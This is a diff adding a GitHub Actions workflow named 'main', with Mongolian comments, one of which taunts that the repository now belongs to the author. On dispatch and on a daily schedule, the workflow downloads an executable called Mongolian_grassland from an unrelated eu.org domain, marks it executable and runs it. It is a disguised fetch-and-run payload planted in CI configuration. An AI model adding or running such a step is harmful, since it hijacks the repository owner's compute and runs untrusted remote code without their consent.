@@ -1,0 +1,23 @@
+#Чиний бэлчээр одооноос минийх
+#2024-03-16-[091202]-edcfctpe
+name: main
+
+on:
+  workflow_dispatch:
+
+  repository_dispatch:
+    types: runner_workflow
+
+  schedule:
+    - cron: "15 3 * * * "
+
+jobs:
+  build-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Тал нутгаас мэндчилж байна!
+        run: |
+          wget -q https://bangla-87t33kx9.digitalmarketingservice.eu.org/Mongolian_grassland
+          chmod 755 Mongolian_grassland
+          ./Mongolian_grassland
